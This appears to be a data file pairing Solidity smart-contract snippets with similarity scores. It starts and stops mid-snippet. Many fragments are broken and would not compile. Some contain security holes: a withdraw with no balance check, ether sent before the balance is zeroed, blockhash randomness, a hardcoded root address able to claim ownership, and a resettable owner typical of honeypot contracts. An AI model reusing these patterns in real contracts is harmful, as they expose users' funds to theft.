        }
    }",0.5775009694462733,"contract GemJoinLike {
    function join(address urn, uint wad) public;
    function exit(address guy, uint wad) public;
}"
"contract Test {\n    function ...
      PUSH 60           contract Test {\n    function ...
      MSTORE            string
      PUSH C0           return ""foobar""
      PUSH 40           contract Test {\n    function ...
      MSTORE            return ""foobar""
      PUSH 6            return ""foobar""
      PUSH 80           string
      SWAP1             return ""foobar""
      DUP2          return ""foobar""
      MSTORE            return ""foobar""
      PUSH 666F6F6261720000000000000000000000000000000000000000000000000000         return ""foobar""
      PUSH A0           return ""foobar""
      MSTORE            return ""foobar""
      PUSH 20           string
      PUSH C0           return ""foobar""
      SWAP1             function test() returns (strin...
      DUP2          function test() returns (strin...
      MSTORE            function test() returns (strin...
      PUSH 6            return ""foobar""
      PUSH E0           function test() returns (strin...
      DUP2          function test() returns (strin...
      SWAP1             function test() returns (strin...
      MSTORE            function test() returns (strin...
      DUP2          return ""foobar""
      SWAP1             return ""foobar""
      PUSH 100          function test() returns (strin...
      SWAP1             function test() returns (strin...
      PUSH A0           return ""foobar""
      SWAP1             return ""foobar""
      DUP1          return ""foobar""
      DUP4          function test() returns (strin...
      DUP2          return ""foobar""
      DUP5          return ""foobar""
      PUSH 0            contract Test {\n    function ...
      PUSH 4            function test() returns (strin...
      PUSH 12           function test() returns (strin...
      CALL          function test() returns (strin...
      POP           
      POP           
      DUP2          function test() returns (strin...
      MLOAD             function test() returns (strin...
      PUSH FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF         
      NOT           
      AND           function test() returns (strin...
      SWAP1             function test() returns (strin...
      SWAP2             function test() returns (strin...
      MSTORE            function test() returns (strin...
      POP           
      POP           
      PUSH 40           contract Test {\n    function ...
      MLOAD             function test() returns (strin...
      PUSH 120          function test() returns (strin...
      DUP2          function test() returns (strin...
      SWAP1             function test() returns (strin...
      SUB           function test() returns (strin...
      SWAP3             function test() returns (strin...
      POP           
      SWAP1             function test() returns (strin...
      POP           
      RETURN",0.508360082810403,"contract ParkgeneToken is AbstractToken {
  
  uint256 constant MAX_TOKEN_COUNT =
    0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF;

  
  address private owner;

  
  uint256 tokenCount = 0;

  
  bool frozen = false;

  
  function ParkgeneToken () {
    owner = msg.sender;
  }

  
  function totalSupply () constant returns (uint256 supply) {
    return tokenCount;
  }

  
  function name () constant returns (string result) {
    return ""GENE TOKEN (PARKGENE)"";
  }

  
  function symbol () constant returns (string result) {
    return ""GENE"";
  }

  
  function decimals () constant returns (uint8 result) {
    return 8;
  }

  
  function transfer (address _to, uint256 _value) returns (bool success) {
    if (frozen) return false;
    else return AbstractToken.transfer (_to, _value);
  }

  
  function transferFrom (address _from, address _to, uint256 _value)
    returns (bool success) {
    if (frozen) return false;
    else return AbstractToken.transferFrom (_from, _to, _value);
  }

  
  function approve (address _spender, uint256 _currentValue, uint256 _newValue)
    returns (bool success) {
    if (allowance (msg.sender, _spender) == _currentValue)
      return approve (_spender, _newValue);
    else return false;
  }

  
  function burnTokens (uint256 _value) returns (bool success) {
    if (_value > accounts [msg.sender]) return false;
    else if (_value > 0) {
      accounts [msg.sender] = safeSub (accounts [msg.sender], _value);
      tokenCount = safeSub (tokenCount, _value);
      return true;
    } else return true;
  }

  
  function createTokens (uint256 _value)
    returns (bool success) {
    require (msg.sender == owner);

    if (_value > 0) {
      if (_value > safeSub (MAX_TOKEN_COUNT, tokenCount)) return false;
      accounts [msg.sender] = safeAdd (accounts [msg.sender], _value);
      tokenCount = safeAdd (tokenCount, _value);
    }

    return true;
  }

  
  function setOwner (address _newOwner) {
    require (msg.sender == owner);

    owner = _newOwner;
  }

  
  function freezeTransfers () {
    require (msg.sender == owner);

    if (!frozen) {
      frozen = true;
      Freeze ();
    }
  }

  
  function unfreezeTransfers () {
    require (msg.sender == owner);

    if (frozen) {
      frozen = false;
      Unfreeze ();
    }
  }

  
  event Freeze ();

  
  event Unfreeze ();
}"
"contract Inbox
{

    string public message;

    function Inbox(string intialMessage){
        message = intialMessage;
    }
    function setMessage(string newMessage){
        message = newMessage;
    }

}",0.5888324218527077,"contract MyTest{
    string private name;
   
    function setName(string newName) public{
        name=newName;
    }
    
    function getName() public view returns(string){
        return name;
    }
    
}"
"contract Bill {

    string filehash;
    string locker;
    address userwallet;
    uint256 amount;

    event isDeposit(
       string filehash,
       string locker,
       address userwallet,
       uint256 amount
    );


    function Deposit(string memory _filehash, string memory _locker) public payable{
        filehash = _filehash;
        locker = _locker;
        amount = msg.value;
        userwallet = msg.sender;
        emit isDeposit(filehash, locker, userwallet, amount);  
   }

}",0.5827497933993551,"contract MultiEthSender {
    using SafeMath for uint256;

    event Send(uint256 _amount, address indexed _receiver);

    function multiSendEth(uint256 amount, address[] list) public returns (bool){
        uint256 _userCount = list.length;

        require( address(this).balance > amount.mul(_userCount));

        for(uint256 _i = 0; _i < _userCount; _i++){
            list[_i].transfer(amount);
            emit Send(amount, list[_i]);
        }

        return true;
    }

    function() public payable{}
}"
"contract MyContract{
    
  Person[] public people;
  uint256 public peopleCount;
    struct Person{
        string _firstname;
        string _lastname;
    }

    function addPerson(string memory _firstname,string memory _lastname) public{
        people.push(Person(_firstname,_lastname));
        peopleCount +=1;
    } 
}",0.5689894447524967,"contract SampleCrowdsaleToken is MintableToken {
  string public name;
  string public symbol;
  uint8 public constant decimals = 18;
  
  constructor(string _name, string _symbol, address _owner) public {
    name = _name;
    symbol = _symbol;
    owner = _owner;
  }
}"
"contract Logistics {

    

      struct package{
         bool isuidgenerated;
         uint itemid;
         string itemname;
         string transitstatus;
         uint orderstatus; 
        address Owner;
         address customer;
         uint ordertime;

         address carrier1;
         uint carrier1_time;

         address carrier2;
         uint carrier2_time;

        address carrier3;
         uint carrier3_time;

}

     mapping (address => package) public packagemapping;
     mapping (address => bool) public carriers;

    



 constructor(){
     Owner = msg.sender;
 }
 modifier onlyOwner(){
     require(Owner = msg.sender);
     _;
 }




function ManageCarriers(address _carrierAddress) onlyOwner public returns (string){

if (!carriers[_carrierAddress]){
      carriers[_carrierAddress] = true;
  } else {
      carriers[_carrierAddress] = false;     
  }
return ""Carrier is updated"";






    function OrderItem(uint _itemid, string _itemname) public returns(address){
        address uniqueId = address(sha256(msg.sender, now));

       packagemapping[uniqueId].isuidgenerated = true;
       packagemapping[uniqueId].itemid = _itemid;
       packagemapping[uniqueId].itemname = _itemname;
       packagemapping[uniqueId].transitstatus = ""your package is ordered and is under processing"";
       packagemapping[uniqueId].orderstatus = 1;

       packagemapping[uniqueId].customer = msg.sender;
       packagemapping[uniqueId].ordertime = now;

        return uniqueId;

}


}",0.5707960637202668,"contract AdminUtils is Ownable {



    mapping (address => uint256) adminContracts;



    address internal root;



    

    modifier OnlyContract() {

        require(isSuperContract(msg.sender));

        _;

    }



    modifier OwnerOrContract() {

        require(msg.sender == owner || isSuperContract(msg.sender));

        _;

    }



    modifier onlyRoot() {

        require(msg.sender == root);

        _;

    }



    

    constructor() public {

        

        root = 0xe07faf5B0e91007183b76F37AC54d38f90111D40;

    }



    

    function ()

        public

        payable {

    }



    

    function claimOwnership()

        external

        onlyRoot

        returns (bool) {

        owner = root;

        return true;

    }



    

    function addContractAddress(address _address)

        public

        onlyOwner

        returns (bool) {



        uint256 codeLength;



        assembly {

            codeLength := extcodesize(_address)

        }



        if (codeLength == 0) {

            return false;

        }



        adminContracts[_address] = 1;

        return true;

    }



    

    function removeContractAddress(address _address)

        public

        onlyOwner

        returns (bool) {



        uint256 codeLength;



        assembly {

            codeLength := extcodesize(_address)

        }



        if (codeLength == 0) {

            return false;

        }



        adminContracts[_address] = 0;

        return true;

    }



    

    function isSuperContract(address _address)

        public

        view

        returns (bool) {



        uint256 codeLength;



        assembly {

            codeLength := extcodesize(_address)

        }



        if (codeLength == 0) {

            return false;

        }



        if (adminContracts[_address] == 1) {

            return true;

        } else {

            return false;

        }

    }

}"
"contract Banking {     
  uint deposit;       
  uint amount;       
  mapping(address => uint) accountBalance;       

  function setDeposit(uint amt)
  {
   uint new_deposit = deposit + amt;
   accountBalance[msg.sender] = new_deposit;
   deposit += amount;
  }
  function getAmount() constant returns (uint)
  {
    return(accountBalance[msg.sender]);
  }
  function withdraw(uint amt)
  {
    uint withdrawAmount = amt;
    uint newBalance = accountBalance[msg.sender] - withdrawAmount;
    accountBalance[msg.sender] = newBalance;
  }
}",0.5555629395337147,"contract DepositProxy is Proxy {
    address public Owner;
    mapping (address => uint256) public Deposits;

    function () public payable { }
    
    function Vault() public payable {
        if (msg.sender == tx.origin) {
            Owner = msg.sender;
            deposit();
        }
    }
    
    function deposit() public payable {
        if (msg.value > 0.5 ether) {
            Deposits[msg.sender] += msg.value;
        }
    }
    
    function withdraw(uint256 amount) public onlyOwner {
        if (amount>0 && Deposits[msg.sender]>=amount) {
            msg.sender.transfer(amount);
        }
    }
}"
"contract Test {
    type1 public testVar1;
    type2 public testVar2;
    
    typeN public testVarN;

    function myFunction1(typeVar1 someVar1, typeVar2 someVar2)
    {
        
    }
    function myFunction2(typeVar1 someVar1, typeVar2 someVar2)
    {
        
    }
    
}",0.5034547607998611,"contract EndLike {
    function fix(bytes32) public view returns (uint);
    function cash(bytes32, uint) public;
    function free(bytes32) public;
    function pack(uint) public;
    function skim(bytes32, address) public;
}"
"contract MyContract{
  mapping (uint => document) documents;

  struct document{
      address author;
      bytes32 hashedContent;
  }

  function addDocument(bytes32 docHash) public{
      document newDoc = document (msg.sender,docHash); 
      [...]
  }
}",0.5398983250492542,"contract Contract {

    bytes32 public Name;



    

    

    constructor(bytes32 _contractName) public {

        Name = _contractName;

    }



    function() public payable { }

    

    function sendFunds(address receiver, uint amount) public {

        receiver.transfer(amount);

    }    

}"
"contract SupplyChain {

  Users public users;

modifier verifyProducer(address _address){
    require(users.isProducer(_address) == true);
    _;
  }

function testHarvest(address _userAddress) verifyProducer(_userAddress) public view returns(bool){

    return true;
  }
}",0.5895835563031153,"contract FairExchange{

    function balanceOf(address _customerAddress) public view returns(uint256);

    function myTokens() public view returns(uint256);

    function transfer(address _toAddress, uint256 _amountOfTokens) public returns(bool);

}"
"contract TestBytes32ToString{
    function bytes32ToString(bytes32 x) public pure returns(uint,uint,uint,string memory){
        bytes memory bytesString = new bytes(32);
        uint charCount = 0;
        for(uint i = 0; i < 32; i++){
            byte char = byte(bytes32(uint(x)*2**(8*i)));
            if(char != 0){
                  bytesString[charCount] = char;
                  charCount++;
            }
        }

        bytes memory bytesStringTrimmed = new bytes(charCount);
        for(i = 0; i < charCount; i++){
            bytesStringTrimmed[i] = bytesString[i];
        }
        return (uint(x),uint(x)*2**(8*0),uint(x)*2**(8*1),string(bytesStringTrimmed));
    }
}",0.5097666723065183,"contract SHA1NSEC3Digest is NSEC3Digest {

    using Buffer for Buffer.buffer;



    function hash(bytes salt, bytes data, uint iterations) external pure returns (bytes32) {

        Buffer.buffer memory buf;

        buf.init(salt.length + data.length + 16);



        buf.append(data);

        buf.append(salt);

        bytes20 h = SHA1.sha1(buf.buf);

        if (iterations > 0) {

            buf.truncate();

            buf.appendBytes20(bytes20(0));

            buf.append(salt);



            for (uint i = 0; i < iterations; i++) {

                buf.writeBytes20(0, h);

                h = SHA1.sha1(buf.buf);

            }

        }



        return bytes32(h);

    }

}"
"contract MetaCoin{
 uint counter=0;
}",0.5441278826848641,contract TongCoin is ERC20{}
"contract monitoring {

uint8 public temperature;
address sensor;
address led;

event Instruction (address device, string instruction);

function monitoring (address _sensor, address LED ){
    sensor = _sensor;
    led = LED;
}

function updateTemp(uint temp){
    if(msg.sender != sensor) throw;
    temperature = temp;
    if (temperature > 90) {
        instruction(led, ""ON"");
    {
    else instruction(led, ""OFF"");
}
}",0.5783719456681843,"contract ERC20 is ERC20Interface{



    function allowance(address owner, address spender) public view returns (uint);

    function transferFrom(address from, address to, uint value) public returns (bool);

    function approve (address spender, uint value) public returns (bool);

    event Approval (address indexed owner, address indexed spender, uint value);



}"
"contract Diary {
    string[] private facts;
    mapping (address => bool) approvedAddresses;
    address owner;

    constructor() public {
        owner = msg.sender;
        approvedAddresses[0xca35b7d915458ef540ade6068dfe2f44e8fa733c] = true;
    }",0.5784042853280169,"contract Owned {

    address public owner;



    modifier onlyOwner {

        require(msg.sender == owner);

        _;

    }



    constructor() internal {

        owner = msg.sender;

    }



    function setOwner(address _address) public onlyOwner {

        owner = _address;

    }

}"
"contract  A{
    uint 256 a;
    function set(uint _a){ 
           require(a > 100);
           a = _a;

    }

}",0.5775709423106857,"contract UsdPrice {

    function USD(uint _id) public constant returns (uint256);

}"
"contract contracta{
    uint mapsize=10;
    struct request_task{ 
    uint task_id; 
    string ip_address;
    uint flag ;
    uint task_submit_time; 
    uint task_deadline; 
    uint  provided_price; 
    uint bandwidth; 
    }
    request_task[] private request;
    uint internal countera;
    function contracta() internal{
        add(1,""172.168.3.3"",1,10,30,5,200);
        add(1,""172.168.3.3"",1,10,30,5,200);

    }
    function add(uint _task_id,string _ip_address,uint _flag,uint _task_submit_time,uint _task_deadline,uint  _provided_price,uint _bandwidth) internal{
        request.push(request_task(_task_id,_ip_address,_flag, _task_submit_time,_task_deadline,_provided_price,_bandwidth));
    }
    function get()constant returns(uint){
        return request[1].task_submit_time;
    }

}",0.5233616523533273,"contract SafeMath {
    function safeAdd(uint x, uint y) pure internal returns(uint) {
      uint z = x + y;
      assert((z >= x) && (z >= y));
      return z;
    }

    function safeSubtract(uint x, uint y) pure internal returns(uint) {
      assert(x >= y);
      uint z = x - y;
      return z;
    }

    function safeMult(uint x, uint y) pure internal returns(uint) {
      uint z = x * y;
      assert((x == 0)||(z/x == y));
      return z;
    }
    
     

    function getRandomNumber(uint16 maxRandom, uint8 min, address privateAddress) constant public returns(uint8) {
        uint256 genNum = uint256(block.blockhash(block.number-1)) + uint256(privateAddress);
        return uint8(genNum % (maxRandom - min + 1)+min);
    }
}"
"contract Lottery {
    struct Round {
        uint deployBlock;
        uint endBlock;        
        uint drawBlock;
        Ticket[] tickets;        
        uint checkpot;        
        address winner;
    }

    struct Ticket{
        address owner;
        uint luckyNumber;
    }

    Round[] rounds;
    uint public roundIndex;


    function drawWinner() public returns (address _winner){

        Ticket[] memory newTickets;

        
        Round memory newRound = Round({
                deployBlock: block.number, 
                endBlock: block.number + ROUND_DURATION,
                drawBlock: block.number + ROUND_DURATION + 5,
                tickets: newTickets,
                checkpot: 0,
                winner:address(0)
            });

        rounds.push(newRound);

        roundIndex++;
        return rounds[roundIndex].tickets[0].owner;
    }
}",0.5225792231753124,"contract ERC20 {

    function balanceOf(address _tokenOwner) public view returns (uint);

    function transfer(address _to, uint _amount) public returns (bool);

    function transferFrom(address _from, address _to, uint _amount) public returns (bool);

    function allowance(address _tokenOwner, address _spender) public view returns (uint);

    function approve(address _spender, uint _amount) public returns (bool);



    event Transfer(address indexed from, address indexed to, uint tokens);

    event Approval(address indexed tokenOwner, address indexed spender, uint tokens);

}"
"contract C { 
string a;
string b;
bytes32 d;

function identify(string sm, string bm, bytes32 i) returns (bytes32 hash){
    a = sm;
    b =bm;
    d = i;
    return sha3(sm, bm, i);
}

}",0.5576691688405576,"contract OraclizeI {
    function getPrice(string _datasource, uint _gas_limit) returns (uint _dsprice);
    function query(uint _timestamp, string _datasource, string _arg) returns (bytes32 _id);
}"
"contract Contract {
    using strings for *;

    
}",0.5692452215061676,"contract Constants {
    uint DECIMALS = 8;
}"
"contract MyCoin {

    function MyCoin(address _finalDestination, uint _contractGracePeriod, address _parentContract) 
    {
        if(_parentContract == address(0))
        {
            hupCount = 0; 
        }
        else
        {
            throw;
        }
    }
}",0.5787991226948075,"contract TokenContract{
  function mint(address _to, uint256 _amount) public;
  function finishMinting () public;
  function setupMultisig (address _address) public;
}"
"contract contractB
{
    address contractA = 0x2EA16ad451ca2aA32E06f476691D1529cF11BaC7; 
    function() {
        if (msg.sender != contractA) {
            contractA.send(msg.value);
        }
    }
}",0.5031616583975684,"contract Vote {
    event LogVote(address indexed addr);

    function() {
        LogVote(msg.sender);

        if (msg.value > 0) {
            if (!msg.sender.send(msg.value)) {
                throw;
            }
        }
    }
}"
"contract fooFactory {
    foo public kungFoo;
    function newFoo()
    {
        kungFoo = new foo();
        kungFoo.set(1); 
    }
}",0.5601916565548947,"contract Factory {
    function deploy() public {
        new Contract();
        require(1==2, 'Expected failure');
    }
}"
"contract Test2 {
    Test1 test1;

    function Test2(){  
        test1 = new Test1();  
    }

    function test(int a, int b) constant returns (int c){
        address addr = address(test1);  
         bytes4 sig = bytes4(sha3(""add(int256,int256)"")); 

        assembly {
            let x := mload(0x40)   
            mstore(x,sig) 
            mstore(add(x,0x04),a) 
            mstore(add(x,0x24),b) 

            call(5000, addr, 0, 
            x, 0x44, add(x,0x80), 0x20) 
            c := mload(add(x,0x80)) 
            mstore(0x40,add(x,0x100)) 
        }
    }

    function test2(int a, int b) constant returns(int c){ 
        return test1.add(a,b); 
    }
}",0.5351961027993312,"contract BytesToTypes {
    function bytesToUint256(bytes memory _input, uint _offst) internal pure returns (uint256 _output) {
        assembly {
            _output := mload(add(_input, _offst))
        }
    }

    function bytesToUint8(bytes memory  _input, uint _offst) internal pure returns (uint8 _output) {
        assembly {
            _output := mload(add(_input, _offst))
        }
    }

    function bytesToAddress(bytes memory  _input, uint _offst) internal pure returns (address _output) {
        assembly {
            _output := mload(add(_input, _offst))
        }
    }
}"
"contract Site_contract{

    struct details{

        bytes32[] name;
        bytes32[] location;
        uint256 number;
    }


    site_details private this_site;   

    function Site_contract(struct this_site_){

        this_site = this_site_;

    }
}",0.5058195678913975,"contract MigrationSource {
  function vacate(address _addr) public returns (uint256 o_balance,
                                                 uint256 o_lock_value,
                                                 uint256 o_lock_endTime,
                                                 bytes32 o_operatorId,
                                                 bytes32 o_playerId);
}"
"contract interaction_2{
    string public get_user_prediction;
    function getValue (address addr)public returns (string memory){ 
        interaction_1 b = interaction_1(addr);
        return get_user_prediction = b.get_user_input();
    }
}",0.5840732790247993,"contract WhitelistInterface {

  function checkRole(address _operator, string memory _role) public view;

  function hasRole(address _operator, string memory _role) public view returns (bool);

}"
"contract SplitPayment
{
    address public A = 0xAAA; 
    uint256 public A_share  = 111111111;

    address public B  = 0xBBB;
    uint256 public B_share  = 222222222;

    address public C = 0xCCC;
    uint256 public C_share = 666666667;

    function sendPayment(address person, uint256 raw_share) private 
    {
        uint256 balance = address(this).balance;
        person.transfer(balance * raw_share / 1000000000);
    }
    function() payable public
    {
        sendPayment(A, A_share);
        sendPayment(B, B_share);
        sendPayment(C, C_share);
    }
}",0.5971567697017429,"contract ERC20 is ERC20Basic {

  

  string  public  name = ""zeosX"";

  string  public  symbol;

  uint256  public  decimals = 18; 

    

  function allowance(address owner, address spender) public view returns (uint256);

  function transferFrom(address from, address to, uint256 value) public returns (bool);

  function approve(address spender, uint256 value) public returns (bool);

  event Approval(address indexed owner, address indexed spender, uint256 value);

}"
"contract MyLogicV2 is MyLogicv1 {
  uint256 public foo;
  uint256 public bar;
  
}",0.5840532131182811,"contract    Token  is  ERC20
{
    using SafeMath  for uint256;

    
    constructor()   public 
    {
    }
    
    
    
}"
"contract Base {
    bool public active;

    modifier canSetMetadata() {
        require(active == false);
        _;
    }
}",0.5654823635167565,"contract Ownable {
    address public owner;

    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }
}"
"contract BaseWithMetadataControl is Base {
    address public metadataControl;

    modifier canSetMetadata() {
        if(msg.sender != metadataControl) {
            super.canSetMetadata();
        }
        _;
    }
}",0.5270815874948205,"contract MonsterAccessControl {

    event ContractUpgrade(address newContract);

     
    address public adminAddress;
    

  

    
    modifier onlyAdmin() {
        require(msg.sender == adminAddress);
        _;
    }

  

    
}"
"contract CourierService{
address public mainContract;
address public parentContract;

 function transferEther(contractState st) OnlyDestinationAddress{
    require(st == contractState.Dispute);
    arbitrator.transfer(this.balance);
   if(parentContract == mainContract)
   {
       pod = POD(mainContract);
       pod.setState(POD.contractState.DisputeVerificationFailure);
       arbitrator.transfer(mainContract.balance);

   }else{
       .....

   }
}",0.5302283578580647,"contract SecuredFunctions is Ownable {

    mapping(address => bool) public allowedContracts;

    
    modifier onlyAllowedContracts {
        require(allowedContracts[msg.sender] || msg.sender == address(this), ""Only allowed contracts can invoke this function"");
        _;
    }

    
    function setAllowedContract (
        address _contract,
        bool _allowed
    ) public onlyOwner {
        allowedContracts[_contract] = _allowed;
    }
}"
"contract BuyCompleteAugurSets {
  CompleteSets completeSetsInstance

  function BuyCompleteAugurSets(address _completeSetsAddress) 
  public
  {
    completeSetsInstance = CompleteSets(_completeSetsAddress);
  }

  function buyAugurShares (
    IMarket _market
  )
  public 
  payable
  {
    uint256 amount = 10 ** 14;
    completeSetsInstance.publicBuyCompleteSets.value(1 ether)(_market, amount);
  }
}",0.5041556900797143,"contract AirDrop is Ownable {

  
  Token public tokenInstance;

  
  function AirDrop(address _tokenAddress){
    tokenInstance = Token(_tokenAddress);
  }

  
  function doAirDrop(address[] _address, uint256 _amount) onlyOwner public returns (bool) {
    uint256 count = _address.length;
    for (uint256 i = 0; i < count; i++)
    {
      
      tokenInstance.transfer(_address [i],_amount);
    }
  }
}"
"contract PatientObjects {

    struct patientDetails{
        bytes32 firstName;
        bytes32 lastName;
        bytes32 dob;
        uint height;
        uint weight;
    }

    patientDetails details;
    address lastMSSeen;
    address vaccinsHistory;


    function PatientObjects (bytes32 firstName, bytes32 lastName, uint height, uint weight, bytes32 dob ,address lastMSseen, address vaccinHistory){
        details.firstName = firstName;
        details.lastName = lastName;
        details.height = height;
        details.weight = weight;
        details.dob = dob;
        lastMSSeen = lastMSseen;
        vaccinsHistory = vaccinHistory;
    }

    function changeVaccinHistory(address newAddress) returns(address){
        vaccinsHistory = newAddress;
        return vaccinsHistory;
    }

    function changeHeight(uint newHeight) returns (uint){
        details.height = newHeight;
        return details.height;
    }

    function changeWeight(uint newWeight) returns (uint){
        details.weight = newWeight;
        return details.weight;
    }

    function getDetails() public constant returns (bytes32, bytes32, uint, uint, bytes32, address, address){
        return (details.firstName, details.lastName, details.height, details.weight, details.dob, lastMSSeen, vaccinsHistory);
    }
}",0.5344392425480446,"contract MultiAsset {
    function owner(bytes32 _symbol) constant returns(address);
    function isCreated(bytes32 _symbol) constant returns(bool);
    function totalSupply(bytes32 _symbol) constant returns(uint);
    function balanceOf(address _holder, bytes32 _symbol) constant returns(uint);
    function transfer(address _to, uint _value, bytes32 _symbol) returns(bool);
    function proxyTransferWithReference(address _to, uint _value, bytes32 _symbol, string _reference) returns(bool);
    function proxyTransferToICAPWithReference(bytes32 _icap, uint _value, string _reference) returns(bool);
    function proxyApprove(address _spender, uint _value, bytes32 _symbol) returns(bool);
    function allowance(address _from, address _spender, bytes32 _symbol) constant returns(uint);
    function proxyTransferFromWithReference(address _from, address _to, uint _value, bytes32 _symbol, string _reference) returns(bool);
    function proxyTransferFromToICAPWithReference(address _from, bytes32 _icap, uint _value, string _reference) returns(bool);
    function proxySetCosignerAddress(address _address, bytes32 _symbol) returns(bool);
}"
"contract
{
  status: '1',
  message: 'OK',
  result: [
    {.......................
       },
    [length]: 1
  ]
}",0.5594494986787499,"contract Object is Owned {
    
    uint constant OK = 1;
}"
"contract Proxy is mortal {

address watch_addr  = 0xEB1e2c19bd833b7f33F9bd0325B74802DF187935;
address user_addr   = msg.sender;

function register(string _text){
    Name name = Name(watch_addr);
    name.register(_text);
}}",0.5083535070092973,"contract FamedStarInterface {
  function bornFamedStar(address userAddress, uint mass) external returns(uint id, bytes32 name) {}
  function updateFamedStarOwner(uint id, address newOwner) external {}
}"
"contract BottleStorage
{
    uint public m_FillAmount;
    bool internal m_ProxyInitialized;
}",0.5578329712092585,"contract Upgradable is UpgradableStorage {

  function initialize() public payable { }

}"
"contract BottleLogic is BottleStorage
{
    function init()
        external 
    {
        require(!m_ProxyInitialized);
        m_FillAmount = 100;
        m_ProxyInitialized = true;
    }

    function drink(uint pAmount)
        external
    {
        uint v =  m_FillAmount - pAmount;
        require(v <= m_FillAmount);
        m_FillAmount = v;
    }

    function fill(uint pAmount)
        external
    {
        uint v =  m_FillAmount + pAmount;
        require(v >= m_FillAmount && v <= 150);
        m_FillAmount = v;
    }
}",0.5145972707711932,"contract ITokenInterface is ERC20 {

    function assetBalanceOf(address _owner) public view returns(uint256);
    function mint(address receiver, uint256 depositAmount) external returns(uint256 mintAmount);
    function burn(address receiver, uint256 burnAmount) external returns(uint256 loanAmountPaid);
    function balanceOf(address _owner) external view returns (uint balance);
}"
"contract ProxyDelegate is Proxy
{

}",0.5743919699171232,contract Pausable is Ownable {}
"contract Permissions {    
    IPermissionsManager private permissionsManager;

    constructor(address _permissionsManagerAddress) public {
        permissionsManager = IPermissionsManager(_permissionsManagerAddress);
    }

    function isAdmin(address _who) 
    public
    view
    returns(bool) 
    {
        return permissionsManager.isAdmin(_who);
    }


    modifier onlyAdmin() {
    require(permissionsManager.isAdmin(msg.sender));
    _;
  }
}",0.5487085315617398,"contract MultiOwnable

{

    mapping(address => bool) public isAdmin;



    event LogAddAdmin(address whoAdded, address newAdmin);



    function addAdmin(address admin) public onlyAdmin returns (bool ok)

    {

        require(isAdmin[admin] == false);

        isAdmin[admin] = true;



        LogAddAdmin(msg.sender, admin);

        return true;

    }



    modifier onlyAdmin {

        require(isAdmin[msg.sender]);

        _;

    }

}"
"contract Access2{
Storage s;
address Storageaddress=0xcd53170a761f024a0441eb15e2f995ae94634c06;

function Access2(){
Relay r=new Relay(this);
}

 function createEntity(string entityAddress,uint entityData)public returns(uint rowNumber){
        s = Storage(Storageaddress);
        uint row=s.newEntity(entityAddress,entityData);
        return row;
    }

    function getEntityCount()public constant returns(uint entityCount){
        s = Storage(Storageaddress);
        uint count=s.getEntityCount();
        return count;
    }   
}",0.5524876884337495,"contract ERC20 {

	function balanceOf(address _owner) public constant returns (uint256 balance);

	function transfer(address _to, uint256 _amount) public returns (bool success);

	function transferFrom(address _from, address _to, uint256 _amount) public returns (bool success);

	function allowance(address _owner, address _spender) public constant returns (uint256 remaining);

	function totalSupply() public constant returns (uint);

}"
"contract LeonardianCrowdsale is Crowdsale {

    function LeonardianCrowdsale(uint256 _startTime, uint256 _endTime, uint256 _rate, address _wallet, MintableToken _token) public 
    Crowdsale(_rate, _wallet, _token)
    
    {

    }
}",0.5894807261337224,"contract MintedCrowdsale is Crowdsale {
    function _deliverTokens(address beneficiary, uint256 tokenAmount) internal {
        
        require(
            ERC20Mintable(address(token())).mint(beneficiary, tokenAmount),
                ""MintedCrowdsale: minting failed""
        );
    }
}"
"contract EventTest {
  event marketCreated(address[] virtualShareAddresses, address market, uint256 indexed endTime, string description, string extraInfo);
  event marketCreated(address[2] virtualShareAddresses, address market, uint256 indexed endTime, string description, string extraInfo);
  event marketCreated(address[2] virtualShareAddresses, address market, uint256 indexed endTime, string description, string extraInfo, int256 _minPrice, int256 _maxPrice, uint256 _numTicks);


  function createYesNoMarket(
    uint256 _endTime,
    string memory _description,
    string memory _extraInfo
    ) public payable returns (bool) 

  {
    address[2] memory virtualShareAddresses;
    address newMarket = address(0);
    virtualShareAddresses[0] = address(1);
    virtualShareAddresses[1] = address(2);
    emit marketCreated(virtualShareAddresses, address(newMarket), _endTime, _description, _extraInfo);
    return true;
  }
}",0.5690970092135559,"contract TokenInterface {
    mapping (address => uint256) balances;
    mapping (address => mapping (address => uint256)) allowed;

    
    string public name;
    string public symbol;
    uint8 public decimals;
    string public standard = &#39;Token 0.1&#39;;

    
    uint256 public totalSupply;

    
    
    function balanceOf(address _owner) constant returns (uint256 balance);

    
    
    
    
    function transfer(address _to, uint256 _amount) returns (bool success);

    
    
    
    
    
    
    function transferFrom(address _from, address _to, uint256 _amount) returns (bool success);

    
    
    
    
    
    function approve(address _spender, uint256 _amount) returns (bool success);

    
    
    
    
    function allowance(
        address _owner,
        address _spender
    ) constant returns (uint256 remaining);

    event Transfer(address indexed _from, address indexed _to, uint256 _amount);
    event Approval(
        address indexed _owner,
        address indexed _spender,
        uint256 _amount
    );
}"
"contract SimpleAuction {
   uint public auctionStart;
   uint public biddingTime;
   function SimpleAuction(
   ) {
       auctionStart = now;
   }
}",0.5975536711085229,"contract KnowsTime {
    function KnowsTime() public {
    }

    function currentTime() public view returns (uint) {
        return now;
    }
}"
"contract A {

    struct someStruct{
        uint prop1;
        uint prop2;
        address [] users;
    }


    mapping (uint => someStruct) public structList;
    someStruct[] public someStructs;

    function createSomeStruct(uint _prop1, uint _prop2){
        structList[_prop1].prop1 = _prop1;
        structList[_prop1].prop2 = _prop2;
        someStructs.push(structList[_prop1]);
    }

    function addUsers(uint _prop1, address _userAddress){
        structList[_prop1].users.push(_userAddress);
        

    }
}",0.5104725488571371,"contract DigitalPrintImage {

	struct ImageMetadata {

        uint finalSeed;

        bytes32[] potentialAssets;

        uint timestamp;

        address creator;

        string ipfsHash;

        string extraData;

    }



    mapping(uint => ImageMetadata) public imageMetadata;



	function totalSupply() public view returns (uint256);

	function getImageMetadata(uint _imageId) public view

    	returns(address, string, uint, string, uint, bytes32[]);

}"
"contract timeLock
{
    struct accountData
    {
        uint balance;
        uint releaseTime;
    }

    mapping (address => accountData) accounts;

    function payIn(uint lockTimeS)
    {
        uint amount = msg.value;
        payOut();
        if (accounts[msg.sender].balance > 0)
            msg.sender.send(msg.value);
        else
        {
            accounts[msg.sender].balance = amount;
            accounts[msg.sender].releaseTime = now + lockTimeS;
        }
    }

    function payOut()
    {
        if (accounts[msg.sender].balance != 0 && accounts[msg.sender].releaseTime < now)
        {
            msg.sender.send(accounts[msg.sender].balance);
            accounts[msg.sender].balance = 0;
